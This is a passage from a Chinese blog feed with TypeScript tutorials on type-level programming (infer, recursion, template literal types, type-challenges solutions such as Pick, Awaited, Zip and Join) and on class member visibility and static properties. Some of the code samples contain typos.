class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = []</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">IsEmptyArray</span>&lt;T exxtends <span class="built_in">unknown</span>[]&gt; = <span class="title class_">Arr</span> <span class="keyword">extends</span> [...inter X[], inter D] ? <span class="literal">true</span> : <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">IsEmptyArray</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> true</span></span><br></pre></td></tr></table></figure><p>这里用 inter “引用”（可以把它当做 var），等价于：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = []</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">IsEmptyArray</span>&lt;T exxtends <span class="built_in">unknown</span>[]&gt; = <span class="title class_">Arr</span> <span class="keyword">extends</span> [...<span class="built_in">unknown</span>[], <span class="built_in">unknown</span>] ? <span class="literal">true</span> : <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">IsEmptyArray</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> true</span></span><br></pre></td></tr></table></figure><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>等价于 for 循环，但是在 TS 中递归有层数限制（不多），有兴趣动手可以测试一下</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = [<span class="string">&#x27;ji&#x27;</span>, <span class="string">&#x27;ni&#x27;</span>, <span class="string">&#x27;tai&#x27;</span>, <span class="string">&#x27;mei&#x27;</span>]</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Reverse</span>&lt;<span class="title class_">Arr</span> <span class="keyword">extends</span> <span class="built_in">unknown</span>[]&gt; = </span><br><span class="line">  <span class="title class_">Arr</span> <span class="keyword">extends</span> [...infer <span class="title class_">Rest</span>, inter <span class="title class_">Last</span>]</span><br><span class="line">    ? [<span class="title class_">Last</span>, ...<span class="title class_">Reverse</span>&lt;<span class="title class_">Rest</span>&gt;]</span><br><span class="line">    : <span class="title class_">Arr</span></span><br><span class="line"></span><br><span class="line">tytpe <span class="title class_">Result</span> = <span class="title class_">Reverse</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> [&#x27;mei&#x27;, &#x27;tai&#x27;, &#x27;ni&#x27;, &#x27;ji&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>合并元组</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="keyword">type</span> B = [<span class="number">3</span>, <span class="built_in">string</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> C = [...A, ...B]</span><br></pre></td></tr></table></figure><p>获取元组的最后一项</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Last</span>&lt;T <span class="keyword">extends</span> <span class="built_in">unknown</span>[]&gt; = T <span class="keyword">extends</span> [...<span class="title class_">Rest</span>, <span class="title class_">Last</span>] ? <span class="title class_">Last</span> : <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> L = <span class="title class_">Last</span>&lt;<span class="title class_">Arr</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="模版字符串"><a href="#模版字符串" class="headerlink" title="模版字符串"></a>模版字符串</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">type</span> C = <span class="string">&#x27;C&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> X  = <span class="string">`<span class="subst">$&#123;A&#125;</span> <span class="subst">$&#123;B&#125;</span> <span class="subst">$&#123;C&#125;</span>`</span> <span class="comment">// <span class="doctag">TODO:</span> &#x27;A B C&#x27;</span></span><br></pre></td></tr></table></figure><p>没错，模版字符串在 TS 中也能使用</p><p>怎么获取字符串的第一个？没错还是用模式匹配</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="string">&#x27;ji ni tai mei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = T <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;inter First&#125;</span><span class="subst">$&#123;<span class="built_in">string</span>&#125;</span>`</span> ? F : <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">First</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> j</span></span><br></pre></td></tr></table></figure><p>那怎么获取字符串的最后一项呢？似乎有点麻烦，也许可能用递归能实现</p><p>但是这个时候就需要换一种思路了，获取元组的最后一项非常简单，那么直到能把字符串转换成元组就好了（体操最重要的就是思路！）</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="string">&#x27;ji ni tai mei&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LastOfArr</span>&lt;T <span class="keyword">extends</span> <span class="built_in">unknown</span>[]&gt; = T <span class="keyword">extends</span>  [...inter _, inter <span class="title class_">Last</span>] ? <span class="title class_">Last</span> : <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">StringToArr</span>&lt;T <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = T <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;inter F&#125;</span><span class="subst">$&#123;inter Rest&#125;</span>`</span> ? [F, ...<span class="title class_">StringToArr</span>&lt;<span class="title class_">Rest</span>&gt;] : []</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LastOfString</span> = <span class="title class_">LastOfArr</span>&lt;<span class="title class_">StringToArr</span>&lt;A&gt;&gt;</span><br></pre></td></tr></table></figure><h5 id="相应的也能转换成联合类型"><a href="#相应的也能转换成联合类型" class="headerlink" title="相应的也能转换成联合类型"></a>相应的也能转换成联合类型</h5><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="string">&#x27;ji ni tai mei&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">StringToUnion</span>&lt;T <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = T <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;inter F&#125;</span><span class="subst">$&#123;inter Rest&#125;</span>`</span> ? F | <span class="title class_">StringToUnion</span>&lt;<span class="title class_">Rest</span>&gt; : <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">StringToUnion</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> &#x27;j&#x27; | &#x27;i&#x27; | &#x27;n&#x27; | &#x27;t&#x27; | &#x27;a&#x27; | &#x27;m&#x27; | &#x27;e&#x27;</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 注意，联合类型自动去重了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：类型体操（下）</title>
      <link href="/Blog/2023/06/15/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%BD%93%E6%93%8D%EF%BC%88%E4%B8%8B%EF%BC%89/index/"/>
      <url>/Blog/2023/06/15/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%BD%93%E6%93%8D%EF%BC%88%E4%B8%8B%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>上难度，直接看 github 上的项目<br><a href="https://github.com/type-challenges/type-challenges">https://github.com/type-challenges/type-challenges</a></p></blockquote><h2 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Todo</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">description</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">completed</span>: <span class="built_in">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">TodoPreview</span> = <span class="title class_">MyPick</span>&lt;<span class="title class_">Todo</span>, <span class="string">&#x27;title&#x27;</span> | <span class="string">&#x27;completed&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">todo</span>: <span class="title class_">TodoPreview</span> = &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;Clean room&#x27;</span>,</span><br><span class="line">    <span class="attr">completed</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyPick</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> K]: T[P]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = (<span class="attr">arg1</span>: <span class="built_in">string</span>, <span class="attr">arg2</span>: <span class="built_in">number</span>): <span class="function"><span class="params">void</span> =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FunctionParamsType</span> = <span class="title class_">MyParameters</span>&lt;<span class="keyword">typeof</span> foo&gt; <span class="comment">// [arg1: string, arg2: number]</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MyParameters</span>&lt;T <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">any</span>[]) =&gt; <span class="built_in">any</span>&gt; = T <span class="keyword">extends</span> (...<span class="attr">any</span>: infer S) =&gt; <span class="built_in">any</span> ? S : <span class="built_in">any</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Awaited"><a href="#Awaited" class="headerlink" title="Awaited"></a>Awaited</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ExampleType</span> = <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">MyAwaited</span>&lt;<span class="title class_">ExampleType</span>&gt; <span class="comment">// string</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Thenable</span>&lt;T&gt; = &#123;</span><br><span class="line">  <span class="attr">then</span>: <span class="function">(<span class="params">onfulfilled: (arg: T) =&gt; <span class="built_in">unknown</span></span>) =&gt;</span> <span class="built_in">unknown</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MyAwaited</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Thenable</span>&lt;<span class="built_in">any</span>&gt; | <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;&gt; = T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;infer <span class="title class_">Inner</span>&gt;</span><br><span class="line">? <span class="title class_">Inner</span> <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt; ? <span class="title class_">MyAwaited</span>&lt;<span class="title class_">Inner</span>&gt; : <span class="title class_">Inner</span></span><br><span class="line">: T <span class="keyword">extends</span> <span class="title class_">Thenable</span>&lt;infer U&gt; ? U : <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="Zip"><a href="#Zip" class="headerlink" title="Zip"></a>Zip</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> exp = <span class="title class_">Zip</span>&lt;[<span class="number">1</span>, <span class="number">2</span>], [<span class="literal">true</span>, <span class="literal">false</span>]&gt; <span class="comment">// expected to be [[1, true], [2, false]]</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Zip</span>&lt;A <span class="keyword">extends</span> <span class="built_in">any</span>[], B <span class="keyword">extends</span> <span class="built_in">any</span>[], L <span class="keyword">extends</span> <span class="built_in">any</span>[] = []&gt; = L[<span class="string">&#x27;length&#x27;</span>] <span class="keyword">extends</span> A[<span class="string">&#x27;length&#x27;</span>] | B[<span class="string">&#x27;length&#x27;</span>]</span><br><span class="line">  ? L</span><br><span class="line">  : <span class="title class_">Zip</span>&lt;A, B, [...L, [A[L[<span class="string">&#x27;length&#x27;</span>]], B[L[<span class="string">&#x27;length&#x27;</span>]]]]&gt;</span><br></pre></td></tr></table></figure><h2 id="IsTuple"><a href="#IsTuple" class="headerlink" title="IsTuple"></a>IsTuple</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> case1 = <span class="title class_">IsTuple</span>&lt;[<span class="built_in">number</span>]&gt; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">type</span> case2 = <span class="title class_">IsTuple</span>&lt;<span class="keyword">readonly</span> [<span class="built_in">number</span>]&gt; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">type</span> case3 = <span class="title class_">IsTuple</span>&lt;<span class="built_in">number</span>[]&gt; <span class="comment">// false</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">IsTuple</span>&lt;T&gt; = </span><br><span class="line">  T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[]?</span><br><span class="line">    <span class="built_in">number</span> <span class="keyword">extends</span> T[<span class="string">&#x27;length&#x27;</span>]?<span class="attr">false</span>:<span class="literal">true</span></span><br><span class="line">  :<span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="Join"><a href="#Join" class="headerlink" title="Join"></a>Join</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Res</span> = <span class="title class_">Join</span>&lt;[<span class="string">&quot;a&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;e&quot;</span>], <span class="string">&quot;-&quot;</span>&gt;; <span class="comment">// expected to be &#x27;a-p-p-l-e&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Res1</span> = <span class="title class_">Join</span>&lt;[<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>], <span class="string">&quot; &quot;</span>&gt;; <span class="comment">// expected to be &#x27;Hello World&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Res2</span> = <span class="title class_">Join</span>&lt;[<span class="string">&quot;2&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;2&quot;</span>], <span class="number">1</span>&gt;; <span class="comment">// expected to be &#x27;21212&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Res3</span> = <span class="title class_">Join</span>&lt;[<span class="string">&quot;o&quot;</span>], <span class="string">&quot;u&quot;</span>&gt;; <span class="comment">// expected to be &#x27;o&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Join</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[], U <span class="keyword">extends</span> <span class="built_in">string</span> | <span class="built_in">number</span>&gt; = T <span class="keyword">extends</span> [infer F, ...infer R]</span><br><span class="line">  ? R[<span class="string">&#x27;length&#x27;</span>] <span class="keyword">extends</span> <span class="number">0</span></span><br><span class="line">    ? <span class="string">`<span class="subst">$&#123;F &amp; <span class="built_in">string</span>&#125;</span>`</span></span><br><span class="line">    : <span class="string">`<span class="subst">$&#123;F &amp; <span class="built_in">string</span>&#125;</span><span class="subst">$&#123;U&#125;</span><span class="subst">$&#123;Join&lt;R, U&gt;&#125;</span>`</span></span><br><span class="line">  : <span class="built_in">never</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：class（下）</title>
      <link href="/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8B%EF%BC%89/index/"/>
      <url>/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8B%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h2 id="成员可见性"><a href="#成员可见性" class="headerlink" title="成员可见性"></a>成员可见性</h2><ul><li>public 类外可见</li><li>private 类内可见 #var 真私有属性</li><li>protected 子类和自己可见</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person1</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> friend?: <span class="title class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span> = friend</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person1</span>(<span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line">p1.<span class="property">friend</span> <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// private</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> friend?: <span class="title class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span> = friend</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">xxx</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>. friend <span class="comment">// <span class="doctag">TODO:</span> 这里是可以使用的</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Person2</span>(<span class="string">&#x27;jack&#x27;</span>, p1)</span><br><span class="line">p2.<span class="property">friend</span> <span class="comment">// <span class="doctag">TODO:</span> typescript 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// protected</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person3</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> friend?: <span class="title class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span> = friend</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">xxx</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>. friend <span class="comment">// <span class="doctag">TODO:</span> 这里是可以使用的</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person3</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> id: <span class="built_in">number</span>, name: <span class="built_in">string</span>, friend?: User</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name, friend)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">yyy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span>  <span class="comment">// <span class="doctag">TODO:</span> 子类这里是可以使用的</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> u = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line">u.<span class="property">friend</span> <span class="comment">// <span class="doctag">TODO:</span> typescript 报错</span></span><br></pre></td></tr></table></figure><blockquote><p>但是这些代码始终都会变成 JS<br>那么说，TS 提供的这三个关键词还有用嘛？<br>显然易见：因为类型擦除，在 JS 中，你又可以随心所欲了<br>但是我就想要私有属性怎么办，那就使用 JS 的 <code>#</code></p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  #friend?: <span class="title class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.#friend = friend</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="property">friend</span> <span class="comment">// <span class="doctag">TODO:</span> typescript 报错</span></span><br></pre></td></tr></table></figure><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>static 的意思是这个属性是通过类名访问的</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  xxx = <span class="number">1</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">xxx</span> <span class="comment">// <span class="doctag">TODO:</span> typescript 报错</span></span><br></pre></td></tr></table></figure><p>所以为了解决上面的问题，面向对象又加了一个关键字，static</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> xxx = <span class="number">1</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">xxx</span> <span class="comment">// <span class="doctag">TODO:</span> 可以使用了</span></span><br></pre></td></tr></table></figure><blockquote><p>这就叫做静态属性<br>这里在提示一下 name 叫做成员属性<br>什么区别？静态属性是代码执行到哪一行的时候就初始化了，而成员属性是实例化后才初始化的</p></blockquote><h4 id="但是使用-staic-的时候需要注意一点"><a href="#但是使用-staic-的时候需要注意一点" class="headerlink" title="但是使用 staic 的时候需要注意一点"></a>但是使用 staic 的时候需要注意一点</h4><p>他不能在固有属性上使用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="attr">name</span>: <span class="built_in">string</span> <span class="comment">// <span class="doctag">TODO:</span> 报错啦</span></span><br><span class="line">  <span class="attr">name</span>: stirng</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/06/14/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9Aclass%EF%BC%88%E4%B8%8B%EF%BC%89/index/img.png"></p><blockquote><p>为什么会这样呢？<br>这又要追寻到 JS 的问题了：JS 中的 class 是用函数实现的<br>怎么证明，用 typeof：</p><p><img 